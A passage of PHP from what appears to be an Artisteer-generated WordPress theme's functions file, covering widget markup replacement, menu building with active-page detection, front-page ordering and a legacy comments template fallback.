		'<!--- BEGIN WidgetContent --->' => "<div class=\"art-BlockContent\">\r\n    <div class=\"art-BlockContent-tl\"></div>\r\n    <div class=\"art-BlockContent-tr\"></div>\r\n    <div class=\"art-BlockContent-bl\"></div>\r\n    <div class=\"art-BlockContent-br\"></div>\r\n    <div class=\"art-BlockContent-tc\"></div>\r\n    <div class=\"art-BlockContent-bc\"></div>\r\n    <div class=\"art-BlockContent-cl\"></div>\r\n    <div class=\"art-BlockContent-cr\"></div>\r\n    <div class=\"art-BlockContent-cc\"></div>\r\n    <div class=\"art-BlockContent-body\">\r\n",
		'<!--- END WidgetContent --->' => "\r\n    </div>\r\n</div>\r\n",
		'<!--- END Widget --->' => "\r\n    </div>\r\n</div>\r\n"
	);
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	if ('' == $replaces[$bwt] && '' == $replaces[$ewt]) {
		$startTitle = 0;
		$endTitle = 0;
		$result = '';
		while (true) {
			$startTitle = strpos($content, $bwt, $endTitle);
			if (false == $startTitle) {
				$result .= substr($content, $endTitle);
				break;
			}
			$result .= substr($content, $endTitle, $startTitle - $endTitle);
			$endTitle = strpos($content, $ewt, $startTitle);
			if (false == $endTitle) {
				$result .= substr($content, $startTitle);
				break;
			}
			$endTitle += strlen($ewt);
		}
		$content = $result;
	}
	$content = str_replace(array_keys($replaces), array_values($replaces), $content);
	echo $content;
	return true;
}

function art_activeID($pages){
	$result = null;
	foreach ($pages as $index => $page){
		if (is_page($page->ID)) { 
			$result = $page;
			break;
		}
	}
	while($result && $result->post_parent) {
		foreach ($pages as $parent){
			if ($parent->ID == $result->post_parent) {
				$result = $parent;
				breack;
			}
		}
	}
	return ($result ? $result->ID : null);
}

function art_blogID($pages){
	$result = null;
	if(!'page' == get_option('show_on_front')) return $result;
	$blogID = get_option('page_for_posts');
	if (!$blogID) return $result;
	foreach ($pages as $index => $page){
		if ($page->ID == $blogID) { 
			$result = $page;
			break;
		}
	}
	while($result && $result->post_parent) {
		foreach ($pages as $parent){
			if ($parent->ID == $result->post_parent) {
				$result = $parent;
				breack;
			}
		}
	}
	return ($result ? $result->ID : null);
}

function art_process_front(&$pages){
	if ('page' != get_option('show_on_front')) return;
	$frontID = get_option('page_on_front');
	if (!$frontID) return;
	foreach ($pages as $index => $page)
		if($page->ID == $frontID) {
			unset($pages[$index]);
			$page->post_parent = '0';
			$page->menu_order = '0';
			array_unshift($pages, $page);
			break;
		}
}

function art_topIDs($pages){
	$result = array();
	foreach ($pages as $index => $page)
		if (!$page->post_parent) $result[]=$page->ID;
	return $result;
}

function art_remove_subitems(&$pages){
	foreach ($pages as $index => $page)
		if ($page->post_parent) unset($pages[$index]);
}

function art_header_page_list_filter($pages)
{
	global $artThemeSettings;
	art_process_front($pages);
	$artThemeSettings['menu.topItemIDs'] = art_topIDs($pages);
	$artThemeSettings['menu.activeID'] = art_activeID($pages);
	$artThemeSettings['menu.blogID'] = art_blogID($pages);
	if (!$artThemeSettings['menu.showSubmenus']) art_remove_subitems($pages);
	return $pages;
}

function art_list_pages_filter($output)
{
	global $artThemeSettings;
	$pref ='page-item-';
	if($artThemeSettings['menu.topItemIDs'])
		foreach($artThemeSettings['menu.topItemIDs'] as $id){
			$output = preg_replace('~<li class="([^"]*)\b(' . $pref . $id . ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' . $artThemeSettings['menu.topItemBegin']
					. '$5' . $artThemeSettings['menu.topItemEnd'] . '</a>', $output, 1);
		}
		
	$frontID = null;
	$blogID = null;
	if('page' == get_option('show_on_front')) {
		$frontID = get_option('page_on_front');
		$blogID = $artThemeSettings['menu.blogID'];
	}
	if ($frontID) 
		$output = preg_replace('~<li class="([^"]*)\b(' . $pref . $frontID . ')\b([^"]*)"><a href="([^"]*)" ~',
			'<li class="$1$2$3"><a href="'. get_option('home') .'" ', $output, 1); 

	if ((is_home() && $blogID) || $artThemeSettings['menu.activeID'])
		$output = preg_replace('~<li class="([^"]*)\b(' . $pref . (is_home() ? $blogID : $artThemeSettings['menu.activeID']) . ')\b([^"]*)"><a ~',
			'<li class="$1$2$3"><a class="active" ', $output, 1);
	return $output;
}

function art_menu_items()
{
	global $artThemeSettings;
	if (true === $artThemeSettings['menu.showHome'] && 'page' != get_option('show_on_front'))
		echo '<li><a' . (is_home() ? ' class="active"' : '') . ' href="' . get_option('home') . '">'.$artThemeSettings['menu.topItemBegin']
			. $artThemeSettings['menu.homeCaption'] . $artThemeSettings['menu.topItemEnd'] . '</a></li>';
	add_action('get_pages', 'art_header_page_list_filter');
	add_action('wp_list_pages', 'art_list_pages_filter');
	wp_list_pages('title_li=');
	remove_action('wp_list_pages', 'art_list_pages_filter');
	remove_action('get_pages', 'art_header_page_list_filter');
}

add_filter('comments_template', 'legacy_comments');  
function legacy_comments($file) {  
    if(!function_exists('wp_list_comments')) : // WP 2.7-only check  
    $file = TEMPLATEPATH.'/legacy.comments.php';  
    endif;  
    return $file;  
};?>
